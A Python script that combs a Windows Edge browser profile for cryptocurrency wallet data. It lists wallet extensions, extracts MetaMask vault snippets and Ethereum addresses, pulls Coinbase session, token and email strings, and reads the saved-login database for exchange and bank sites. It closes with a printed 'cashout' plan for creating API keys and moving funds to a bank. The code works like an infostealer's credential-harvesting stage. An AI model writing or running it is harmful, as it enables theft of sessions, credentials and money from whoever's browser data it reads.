#!/usr/bin/env python3
"""
CHECK EDGE BROWSER WALLET DATA
MetaMask and Coinbase sessions found in Edge IndexedDB
"""
import os
import json
import struct
import sqlite3
import logging

logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger(__name__)
BASE = r"C:\Users\Admin"
EDGE_BASE = os.path.join(BASE, r'AppData\Local\Microsoft\Edge\User Data\Default')

logger.info("=" * 60)
logger.info("EDGE BROWSER WALLET DATA CHECK")
logger.info("=" * 60)

# ============================================================
# 1. CHECK EDGE EXTENSIONS FOR METAMASK
# ============================================================
logger.info("\n[1] CHECKING EDGE EXTENSIONS...")

ext_path = os.path.join(EDGE_BASE, 'Extensions')
if os.path.exists(ext_path):
    for ext_id in os.listdir(ext_path):
        ext_dir = os.path.join(ext_path, ext_id)
        if os.path.isdir(ext_dir):
            # Check manifest for wallet extensions
            for ver in os.listdir(ext_dir):
                manifest_path = os.path.join(ext_dir, ver, 'manifest.json')
                if os.path.exists(manifest_path):
                    try:
                        with open(manifest_path, 'r', errors='ignore') as f:
                            manifest = json.load(f)
                        name = manifest.get('name', '').lower()
                        desc = manifest.get('description', '').lower()
                        if any(kw in name + desc for kw in ['metamask', 'wallet', 'crypto', 'coinbase', 'phantom', 'trust', 'web3']):
                            logger.info("  FOUND: %s v%s", manifest.get('name', '?'), manifest.get('version', '?'))
                            logger.info("    ID: %s", ext_id)
                            logger.info("    Desc: %s", manifest.get('description', '?')[:100])
                    except Exception as e:
                        logger.debug("Skipped: %s", e)

# ============================================================
# 2. CHECK METAMASK WEB INDEXEDDB
# ============================================================
logger.info("\n[2] METAMASK INDEXEDDB DATA...")

mm_db_paths = [
    os.path.join(EDGE_BASE, 'IndexedDB', 'https_app.metamask.io_0.indexeddb.leveldb'),
    os.path.join(EDGE_BASE, 'IndexedDB', 'https_metamask.io_0.indexeddb.leveldb'),
    os.path.join(EDGE_BASE, 'IndexedDB', 'https_portfolio.metamask.io_0.indexeddb.leveldb'),
]

for db_path in mm_db_paths:
    if os.path.exists(db_path):
        db_name = os.path.basename(os.path.dirname(db_path)) if 'indexeddb' in db_path else os.path.basename(db_path)
        logger.info("\n  DB: %s", os.path.basename(os.path.dirname(db_path)))
        
        # List files in the leveldb
        files = os.listdir(db_path)
        total_size = sum(os.path.getsize(os.path.join(db_path, f)) for f in files if os.path.isfile(os.path.join(db_path, f)))
        logger.info("    Files: %s, Total size: %.1f KB", len(files), total_size / 1024)
        log_path = os.path.join(db_path, 'LOG')
        if os.path.exists(log_path):
            try:
                with open(log_path, 'r', errors='ignore') as f:
                    log_content = f.read()
                # Look for interesting entries
                for line in log_content.split('\n'):
                    if any(kw in line.lower() for kw in ['created', 'recovered', 'version', 'compacted']):
                        logger.info("    LOG: %s", line.strip()[:100])
            except Exception as e:
                logger.debug("Skipped: %s", e)
        
        # Try to read .ldb files for vault data
        for f in sorted(files):
            if f.endswith('.ldb') or f.endswith('.log'):
                fpath = os.path.join(db_path, f)
                try:
                    with open(fpath, 'rb') as fh:
                        data = fh.read()
                    
                    # Search for vault-related strings
                    text = data.decode('utf-8', errors='ignore')
                    
                    # Look for MetaMask vault (encrypted)
                    if 'vault' in text.lower():
                        logger.info("    %s: Contains vault reference (%s bytes)", f, len(data))
                        # Find vault JSON
                        vault_start = text.find('"vault"')
                        if vault_start == -1:
                            vault_start = text.find('vault')
                        if vault_start >= 0:
                            snippet = text[max(0, vault_start-20):vault_start+200]
                            # Clean non-printable
                            snippet = ''.join(c for c in snippet if c.isprintable() or c in '\n\t')
                            logger.info("      Snippet: %s", snippet[:150])
                    
                    # Look for addresses
                    import re
                    eth_addrs = re.findall(r'0x[a-fA-F0-9]{40}', text)
                    if eth_addrs:
                        unique_addrs = list(set(eth_addrs))
                        logger.info("    %s: Found %s ETH addresses", f, len(unique_addrs))
                        for addr in unique_addrs[:5]:
                            logger.info("      %s", addr)
                    
                    # Look for account names / identities
                    if 'selectedAddress' in text or 'identities' in text:
                        logger.info("    %s: Contains account identity data", f)
                        
                except Exception as e:
                    logger.debug("Skipped: %s", e)

# ============================================================
# 3. CHECK COINBASE WEB SESSION
# ============================================================
logger.info("\n[3] COINBASE WEB SESSION DATA...")

cb_db_paths = [
    os.path.join(EDGE_BASE, 'IndexedDB', 'https_login.coinbase.com_0.indexeddb.leveldb'),
    os.path.join(EDGE_BASE, 'IndexedDB', 'https_www.coinbase.com_0.indexeddb.leveldb'),
]

for db_path in cb_db_paths:
    if os.path.exists(db_path):
        logger.info("\n  DB: %s", os.path.basename(os.path.dirname(db_path)))
        files = os.listdir(db_path)
        total_size = sum(os.path.getsize(os.path.join(db_path, f)) for f in files if os.path.isfile(os.path.join(db_path, f)))
        logger.info("    Files: %s, Total size: %.1f KB", len(files), total_size / 1024)
        
        for f in sorted(files):
            if f.endswith('.ldb') or f.endswith('.log'):
                fpath = os.path.join(db_path, f)
                try:
                    with open(fpath, 'rb') as fh:
                        data = fh.read()
                    text = data.decode('utf-8', errors='ignore')
                    
                    # Look for session/auth tokens
                    if any(kw in text.lower() for kw in ['token', 'session', 'auth', 'user', 'email', 'account']):
                        clean = ''.join(c for c in text if c.isprintable())[:300]
                        logger.info("    %s: Has session data (%s bytes)", f, len(data))
                        
                        # Look for email
                        import re
                        emails = re.findall(r'[\w.+-]+@[\w-]+\.[\w.]+', text)
                        if emails:
                            logger.info("      Email found: %s", list(set(emails))[:3])
                except Exception as e:
                    logger.debug("Skipped: %s", e)

# ============================================================
# 4. EDGE SAVED PASSWORDS (encrypted, but shows sites)
# ============================================================
logger.info("\n[4] EDGE SAVED LOGIN SITES (encrypted passwords)...")

login_db = os.path.join(EDGE_BASE, 'Login Data')
if os.path.exists(login_db):
    try:
        import shutil
        temp_db = os.path.join(os.environ.get('TEMP', '.'), 'edge_logins_tmp.db')
        shutil.copy2(login_db, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # List exchange/wallet/payment site logins
        cursor.execute("SELECT origin_url, username_value, date_created FROM logins")
        
        exchange_keywords = ['kraken', 'coinbase', 'binance', 'crypto', 'metamask', 'phantom',
                           'paypal', 'venmo', 'cashapp', 'robinhood', 'gemini', 'kucoin',
                           'bybit', 'okx', 'gate.io', 'bitfinex', 'bitget', 'mexc',
                           'wallet', 'exodus', 'ledger', 'trezor', 'uniswap', 'opensea',
                           'amazon', 'ebay', 'bank', 'chase', 'wellsfargo', 'bofa']
        
        all_logins = cursor.fetchall()
        relevant = []
        for url, user, date in all_logins:
            url_lower = url.lower()
            if any(kw in url_lower for kw in exchange_keywords):
                relevant.append((url, user, date))
        
        if relevant:
            logger.info("  Found %s relevant saved logins:", len(relevant))
            for url, user, date in relevant:
                # Mask email slightly
                if '@' in user:
                    parts = user.split('@')
                    masked = parts[0][:3] + '***@' + parts[1]
                else:
                    masked = user[:5] + '***' if len(user) > 5 else user
                logger.info("    %s", url[:60])
                logger.info("      User: %s", masked)
        else:
            logger.info("  No exchange/wallet logins saved (total logins: %s)", len(all_logins))
            # Show all sites
            if all_logins:
                logger.info("  All saved login sites:")
                for url, user, _ in all_logins[:20]:
                    logger.info("    %s", url[:80])
        
        conn.close()
        os.remove(temp_db)
    except Exception as e:
        logger.error("  Error: %s", e)
else:
    logger.info("  No login data found")

# ============================================================
# IMMEDIATE ACTION PLAN
# ============================================================
logger.info("%s", "\n" + "=" * 60)
logger.info("IMMEDIATE ACTION PLAN")
logger.info("=" * 60)
logger.info("""
Based on what was found, here's your fastest cashout path:

1. OPEN EDGE BROWSER right now
   - Go to https://www.coinbase.com - you may still be logged in
   - Go to https://app.metamask.io - check if MetaMask session active
   - Go to https://www.kraken.com - log in if you have account

2. If Coinbase is logged in:
   - Go to Settings > API > Create New Key
   - Download the key JSON
   - Save to _SENSITIVE folder
   - Run exchange_tester.py again

3. If MetaMask has funds:
   - Send to your Coinbase/Kraken deposit address
   - Sell for USD
   - Withdraw to bank

4. Generate FRESH API keys for exchanges you have accounts on
""")
